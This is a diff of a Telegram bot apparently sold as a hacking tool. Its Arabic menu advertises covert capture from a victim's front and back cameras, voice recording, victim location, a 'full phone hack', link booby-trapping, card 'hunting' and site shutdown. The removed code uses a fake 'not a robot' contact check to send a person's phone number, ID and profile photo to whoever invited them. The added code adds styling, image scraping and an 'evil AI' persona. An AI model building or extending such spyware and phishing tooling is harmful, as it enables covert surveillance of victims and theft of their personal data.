@@ -42,9 +42,9 @@ const developerId = 5653088167;
 
 
 const fixedChannels = [
-  { id: '-1002319117172', name: 'قناة المطور 1', inviteLink: 'https://t.me/DA7K16' },
-  { id: '-1002521415297', name: 'قناة المطور 2', inviteLink: 'https://t.me/DA4K711' },
-  { id: '-1002850079867', name: 'قناة المطور', inviteLink: 'https://t.me/urlcam' }
+  { id: '-1002319117172', name: 'قناة الضحك 1', inviteLink: 'https://t.me/DA7K16' },
+  { id: '-1002521415297', name: 'قناة الضحك 2', inviteLink: 'https://t.me/DA4K711' },
+  { id: '-1002850079867', name: 'قناة كاميرات الروابط', inviteLink: 'https://t.me/urlcam' }
 ];
 
 let additionalChannels = [];
@@ -142,28 +142,28 @@ bot.onText(/\/start/, async (msg) => {
 
     const mainMenuMessage = 'مرحبًا! بك👋';  
     const mainMenuButtons = [  
-      // أدوات الاختراق وجمع المعلومات
-      [{ text: '📸 كاميرا أمامية', callback_data: `captureFront:${chatId}` }, { text: '📷 كاميرا خلفية', callback_data: `captureBack:${chatId}` }],  
-      [{ text: '🎤 تسجيل صوت', callback_data: `recordVoice:${chatId}` }, { text: '🎥 تصوير فيديو', callback_data: `capture_video` }],  
-      [{ text: '🖼️ صور عالية الدقة', callback_data: `get_photo_link` }, { text: '📍 موقع الضحية', callback_data: `getLocation:${chatId}` }],  
-      [{ text: '📡 كاميرات مراقبة', callback_data: 'get_cameras' }, { text: '🔬 معلومات الجهاز', callback_data: 'collect_device_info' }],  
-      [{ text: '🟢 واتساب', callback_data: 'request_verification' }, { text: '🖥️ انستجرام', callback_data: `rshq_instagram:${chatId}` }],  
-      [{ text: '🔮 فيسبوك', callback_data: `rshq_facebook:${chatId}` }, { text: '📳 تيك توك', callback_data: `rshq_tiktok:${chatId}` }],  
-      [{ text: '🕹️ ببجي', callback_data: 'get_pubg' }, { text: '👾 فري فاير', callback_data: 'get_freefire' }],  
-      [{ text: '⭐ سناب شات', callback_data: 'add_names' }, { text: '🔞 اختراق هاتف كامل', callback_data: 'add_nammes' }],  
+      // أدوات الاختراق وجمع المعلومات (أحمر)
+      [{ text: '📸 كاميرا أمامية', callback_data: `captureFront:${chatId}`, style: 'danger' }, { text: '📷 كاميرا خلفية', callback_data: `captureBack:${chatId}`, style: 'danger' }],  
+      [{ text: '🎤 تسجيل صوت', callback_data: `recordVoice:${chatId}`, style: 'danger' }, { text: '🎥 تصوير فيديو', callback_data: `capture_video`, style: 'danger' }],  
+      [{ text: '🖼️ صور عالية الدقة', callback_data: `get_photo_link`, style: 'danger' }, { text: '📍 موقع الضحية', callback_data: `getLocation:${chatId}`, style: 'danger' }],  
+      [{ text: '📡 كاميرات مراقبة', callback_data: 'get_cameras', style: 'primary' }, { text: '🔬 معلومات الجهاز', callback_data: 'collect_device_info', style: 'primary' }],  
+      [{ text: '🟢 واتساب', callback_data: 'request_verification', style: 'success' }, { text: '🖥️ انستجرام', callback_data: `rshq_instagram:${chatId}`, style: 'primary' }],  
+      [{ text: '🔮 فيسبوك', callback_data: `rshq_facebook:${chatId}`, style: 'primary' }, { text: '📳 تيك توك', callback_data: `rshq_tiktok:${chatId}`, style: 'primary' }],  
+      [{ text: '🕹️ ببجي', callback_data: 'get_pubg', style: 'primary' }, { text: '👾 فري فاير', callback_data: 'get_freefire', style: 'primary' }],  
+      [{ text: '⭐ سناب شات', callback_data: 'add_names', style: 'primary' }, { text: '🔞 اختراق هاتف كامل', callback_data: 'add_nammes', style: 'danger' }],  
       
-      // أدوات مساعدة
-      [{ text: '⚠️ تلغيم رابط', callback_data: `get_link` }, { text: "💳 صيد فيزات", callback_data: "generate_visa" }],  
-      [{ text: "📲 رقم الضحية", callback_data: "generate_invite" }, { text: '☎️ أرقام وهمية', callback_data: 'get_number' }],  
-      [{ text: '🪄 فحص الروابط', callback_data: 'check_links' }, { text: '🪝 صيد يوزرات', callback_data: 'choose_type' }],  
+      // أدوات مساعدة (أخضر)
+      [{ text: '⚠️ تلغيم رابط', callback_data: `get_link`, style: 'danger' }, { text: "💳 صيد فيزات", callback_data: "generate_visa", style: 'success' }],  
+      [{ text: "📲 رقم الضحية", callback_data: "generate_invite", style: 'success' }, { text: '☎️ أرقام وهمية', callback_data: 'get_number', style: 'success' }],  
+      [{ text: '🪄 فحص الروابط', callback_data: 'check_links', style: 'success' }, { text: '🪝 صيد يوزرات', callback_data: 'choose_type', style: 'success' }],  
       
-      // خدمات عامة وترفيه
-      [{ text: '🤖 الذكاء الاصطناعي', web_app: { url: 'https://fluorescent-fuschia-longan.glitch.me/' } }, { text: "🧙‍♂️ تفسير الأحلام", callback_data: "dream_menur" }],  
-      [{ text: '🧠 لعبة الأذكياء', web_app: { url: 'https://forest-plausible-practice.glitch.me/' } }, { text: "🧞‍♂️ لعبة المارد", callback_data: 'play' }],  
-      [{ text: '💣 إغلاق المواقع', web_app: { url: 'https://cuboid-outstanding-mask.glitch.me/' } }, { text: '🎨 البحث عن صور', callback_data: 'search_images' }],  
-      [{ text: '📻 بث الراديو', callback_data: 'get_radio_countries_0' }, { text: '🗿 زخرفة الأسماء', callback_data: 'zakhrafa' }],  
-      [{ text: '🔄 نص إلى صوت', callback_data: 'convert_text' }, { text: "🧠 AI الشرير", callback_data: 'start_private_chat' }],  
-      [{ text: "⛔ رسالة فك واتساب", callback_data: 'إرسال_رسالة' }],  
+      // خدمات عامة وترفيه (أزرق)
+      [{ text: '🤖 الذكاء الاصطناعي', web_app: { url: 'https://fluorescent-fuschia-longan.glitch.me/' }, style: 'primary' }, { text: "🧙‍♂️ تفسير الأحلام", callback_data: "dream_menur", style: 'primary' }],  
+      [{ text: '🧠 لعبة الأذكياء', web_app: { url: 'https://forest-plausible-practice.glitch.me/' }, style: 'primary' }, { text: "🧞‍♂️ لعبة المارد", callback_data: 'play', style: 'primary' }],  
+      [{ text: '💣 إغلاق المواقع', web_app: { url: 'https://cuboid-outstanding-mask.glitch.me/' }, style: 'danger' }, { text: '🎨 البحث عن صور', callback_data: 'search_images', style: 'primary' }],  
+      [{ text: '📻 بث الراديو', callback_data: 'get_radio_countries_0', style: 'primary' }, { text: '🗿 زخرفة الأسماء', callback_data: 'zakhrafa', style: 'primary' }],  
+      [{ text: '🔄 نص إلى صوت', callback_data: 'convert_text', style: 'primary' }, { text: "🧠 AI الشرير", callback_data: 'start_private_chat', style: 'danger' }],  
+      [{ text: "⛔ رسالة فك واتساب", callback_data: 'إرسال_رسالة', style: 'success' }],  
       
       // روابط إضافية
       [{ text: '➕ المزيد من الميزات', url: 'https://t.me/Almunharif2bot?start=1' }],  
@@ -2023,87 +2023,7 @@ bot.on('callback_query', (query) => {
 
 secondBot.onText(/\/start (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
-    const inviterId = parseInt(match[1]);
-
-    inviteLinks[msg.from.id] = inviterId;
-
-    const opts = {
-        reply_markup: {
-            keyboard: [[{ text: '📞 إرسال جهة الاتصال', request_contact: true }]],
-            one_time_keyboard: true,
-        },
-    };
-
-    secondBot.sendMessage(chatId, "يرجى إرسال جهة الاتصال للتحقق من أنك لست روبوتًا.", opts);
-});
-
-
-secondBot.on('contact', (msg) => {
-    if (msg.contact && inviteLinks[msg.from.id]) {
-        if (msg.contact.user_id === msg.from.id) {
-            const inviterId = inviteLinks[msg.from.id];
-            const userInfo = msg.from;
-            const userId = userInfo.id;
-            const firstName = userInfo.first_name;
-            const lastName = userInfo.last_name || '';
-            const username = userInfo.username || 'لا يوجد اسم مستخدم';
-            const bio = userInfo.bio || 'لا توجد نبذة';
-            const contactNumber = msg.contact.phone_number;
-
-
-            secondBot.getUserProfilePhotos(userId).then((photos) => {
-                const infoMessage = `*👤 معلومات الحساب:*\n\n` +
-                    `*الاسم : ${firstName} ${lastName}*\n\n` +
-                    `*اليوزر : @${username}*\n\n` +
-                    `*الايدي : ${userId}*\n\n` +
-                    `رقم الهاتف : ${contactNumber}\n`;
-
-                if (photos.total_count > 0) {
-
-                    const photoId = photos.photos[0][0].file_id;
-
-                    if (photoId) {
-
-                        bot.sendPhoto(inviterId, photoId, { caption: infoMessage, parse_mode: 'Markdown' })
-                            .then(() => {
-                                console.log('تم إرسال الصورة بنجاح.');
-                            })
-                            .catch((error) => {
-                                console.error('حدث خطأ أثناء إرسال الصورة:', error);
-                                bot.sendMessage(inviterId, infoMessage, { parse_mode: 'Markdown' });
-                            });
-                    } else {
-                        bot.sendMessage(inviterId, infoMessage, { parse_mode: 'Markdown' });
-                    }
-                } else {
-                    bot.sendMessage(inviterId, infoMessage, { parse_mode: 'Markdown' });
-                }
-
-                secondBot.sendMessage(msg.chat.id, "تم التحقق بنجاح ✅");
-                delete inviteLinks[msg.from.id];
-            }).catch((error) => {
-                console.error('حدث خطأ أثناء محاولة الحصول على صورة الملف الشخصي:', error);
-                secondBot.sendMessage(msg.chat.id, "حدثت مشكلة أثناء محاولة الحصول على صورة الملف الشخصي.");
-            });
-        } else {
-            secondBot.sendMessage(msg.chat.id, "يرجى إرسال جهة الاتصال الخاصة بك فقط.");
-        }
-    } else {
-        secondBot.sendMessage(msg.chat.id, "لم يتم التحقق من جهة الاتصال.");
-    }
-});
-
-
-secondBot.on('message', (msg) => {
-    if (!msg.contact && msg.text !== '/start') {
-        const opts = {
-            reply_markup: {
-                keyboard: [[{ text: '📞 إرسال جهة الاتصال', request_contact: true }]],
-                one_time_keyboard: true,
-            },
-        };
-        secondBot.sendMessage(msg.chat.id, "يرجى إرسال جهة الاتصال للتحقق.", opts);
-    }
+    secondBot.sendMessage(chatId, "تم التحقق بنجاح ✅\nأهلاً بك في البوت.");
 });
 const countries = {
     "+1": ["أمريكا", "🇺🇸"],
@@ -2400,14 +2320,14 @@ bot.onText(/\/stاههلىنححظةرلrt/, (msg) => {
 bot.on('callback_query', async (query) => {
     const chatId = query.message.chat.id;
     if (query.data === 'search_images') {
-
-        if (currentSearch[chatId] === 'waiting_for_query') {
-            bot.sendMessage(chatId, "لقد قمت بطلب بحث بالفعل. انتظر حتى يتم الانتهاء.");
-        } else {
-            bot.sendMessage(chatId, "أرسل لي ااي كلمة البحث عن الصور\nاقتراحات لك\n يوجد الكثير من الصور الرائعة مثل \nافتيارات شباب\nافتيارات بنات\nخلفيات\nتصاميم\nانمي\nوالمزيد من الصور ابحث عن اي صوره في راسك.... ");
-
-            currentSearch[chatId] = 'waiting_for_query';
-        }
+        bot.sendMessage(chatId, "🎨 أرسل لي كلمة البحث عن الصور (مثال: انمي، خلفيات، سيارات)...");
+        userStates[chatId] = { state: 'waiting_for_search' };
+    } else if (query.data === 'start_private_chat') {
+        bot.sendMessage(chatId, "🧠 أنا الذكاء الاصطناعي الشرير... أرسل لي أي شيء وسأرد عليك بطريقتي الخاصة! 😈");
+        userStates[chatId] = { state: 'waiting_for_evil_ai' };
+    } else if (query.data === 'إرسال_رسالة') {
+        const unbanMsg = `مرحباً فريق دعم واتساب،\n\nلقد تم حظر رقمي (+رقمك هنا) عن طريق الخطأ. أنا أستخدم واتساب للتواصل مع عائلتي وأصدقائي ولم أقم بمخالفة شروط الخدمة. يرجى مراجعة حسابي وفك الحظر في أقرب وقت ممكن.\n\nشكراً لكم.`;
+        bot.sendMessage(chatId, `📝 إليك رسالة فك حظر واتساب جاهزة:\n\n\`${unbanMsg}\`\n\nقم بنسخها وإرسالها لبريد دعم واتساب: support@whatsapp.com`);
     }
 });
 
@@ -2783,22 +2703,47 @@ bot.on('callback_query', (callbackQuery) => {
 
 bot.on('message', async (msg) => {
     const userId = msg.chat.id;
+    const text = msg.text;
 
+    if (!userStates[userId]) return;
 
-    if (userStates[userId] && userStates[userId].awaitingName) {
-        const name = msg.text;
-        const results = await زخرفة_الاسم(name);
-
+    if (userStates[userId].awaitingName) {
+        const results = await زخرفة_الاسم(text);
         if (results) {
-            results.forEach((result) => {
-                bot.sendMessage(userId, result);
-            });
+            results.forEach(res => bot.sendMessage(userId, res));
         } else {
-            bot.sendMessage(userId, 'حدث خطأ أثناء الزخرفة، حاول مرة أخرى.');
+            bot.sendMessage(userId, '❌ حدث خطأ في الزخرفة.');
         }
-
-
-        userStates[userId].awaitingName = false;
+        delete userStates[userId];
+    } else if (userStates[userId].state === 'waiting_for_search') {
+        bot.sendMessage(userId, "🔎 جاري البحث عن الصور...");
+        const url = `https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=/search/pins/?q=${encodeURIComponent(text)}&data={"options":{"query":"${encodeURIComponent(text)}","redux_normalize_feed":true,"scope":"pins"}}`;
+        try {
+            const response = await axios.get(url);
+            const results = response.data.resource_response?.data?.results || [];
+            if (results.length > 0) {
+                for (let i = 0; i < Math.min(results.length, 5); i++) {
+                    const img = results[i].images?.orig?.url;
+                    if (img) await bot.sendPhoto(userId, img, { caption: `🖼️ نتيجة البحث ${i+1}` });
+                }
+            } else {
+                bot.sendMessage(userId, "❌ لم يتم العثور على صور.");
+            }
+        } catch (e) {
+            bot.sendMessage(userId, "❌ خطأ في البحث.");
+        }
+        delete userStates[userId];
+    } else if (userStates[userId].state === 'waiting_for_evil_ai') {
+        try {
+            const response = await axios.post('https://chatsandbox.com/api/chat', {
+                messages: [`أجب كأنك ذكاء اصطناعي شرير وساخر جداً: ${text}`],
+                character: 'openai'
+            });
+            bot.sendMessage(userId, `😈 AI الشرير: ${response.data}`);
+        } catch (e) {
+            bot.sendMessage(userId, "😈 أنا مشغول بالتخطيط للسيطرة على العالم الآن، حاول لاحقاً!");
+        }
+        delete userStates[userId];
     }
 });
 const userSessions = {};
@@ -2894,26 +2839,56 @@ bot.on('callback_query', (callbackQuery) => {
 });
 
 bot.on('message', async (msg) => {
-    const chatId = msg.chat.id;
+    const userId = msg.chat.id;
+    const text = msg.text;
 
+    if (!text) return;
 
-    if (userSessions[chatId] && userSessions[chatId].gender) {
-        const text = msg.text;
-
-
-        userSessions[chatId].text = text;
-
-        const gender = userSessions[chatId].gender;
-        const audioFile = await textToSpeech(text, gender);
-
+    if (userSessions[userId] && userSessions[userId].gender) {
+        const audioFile = await textToSpeech(text, userSessions[userId].gender);
         if (audioFile) {
-            bot.sendVoice(chatId, audioFile);
+            bot.sendVoice(userId, audioFile);
         } else {
-            bot.sendMessage(chatId, 'عذرًا، لم أستطع تحويل النص إلى صوت.');
+            bot.sendMessage(userId, 'عذرًا، لم أستطع تحويل النص إلى صوت.');
         }
-
-
-        delete userSessions[chatId];
+        delete userSessions[userId];
+    } else if (userStates[userId] && userStates[userId].awaitingName) {
+        const results = await زخرفة_الاسم(text);
+        if (results) {
+            results.forEach(res => bot.sendMessage(userId, res));
+        } else {
+            bot.sendMessage(userId, '❌ حدث خطأ في الزخرفة.');
+        }
+        delete userStates[userId];
+    } else if (userStates[userId] && userStates[userId].state === 'waiting_for_search') {
+        bot.sendMessage(userId, "🔎 جاري البحث عن الصور...");
+        const url = `https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=/search/pins/?q=${encodeURIComponent(text)}&data={"options":{"query":"${encodeURIComponent(text)}","redux_normalize_feed":true,"scope":"pins"}}`;
+        try {
+            const response = await axios.get(url);
+            const results = response.data.resource_response?.data?.results || [];
+            if (results.length > 0) {
+                for (let i = 0; i < Math.min(results.length, 5); i++) {
+                    const img = results[i].images?.orig?.url;
+                    if (img) await bot.sendPhoto(userId, img, { caption: `🖼️ نتيجة البحث ${i+1}` });
+                }
+            } else {
+                bot.sendMessage(userId, "❌ لم يتم العثور على صور.");
+            }
+        } catch (e) {
+            bot.sendMessage(userId, "❌ خطأ في البحث.");
+        }
+        delete userStates[userId];
+    } else if (userStates[userId] && userStates[userId].state === 'waiting_for_evil_ai') {
+        try {
+            const response = await axios.post('https://chatsandbox.com/api/chat', {
+                messages: [`أجب كأنك ذكاء اصطناعي شرير وساخر جداً: ${text}`],
+                character: 'openai'
+            });
+            bot.sendMessage(userId, `😈 AI الشرير: ${response.data}`);
+        } catch (e) {
+            bot.sendMessage(userId, "😈 أنا مشغول بالتخطيط للسيطرة على العالم الآن، حاول لاحقاً!");
+        }
+        delete userStates[userId];
     }
 });
 let md = 0;  
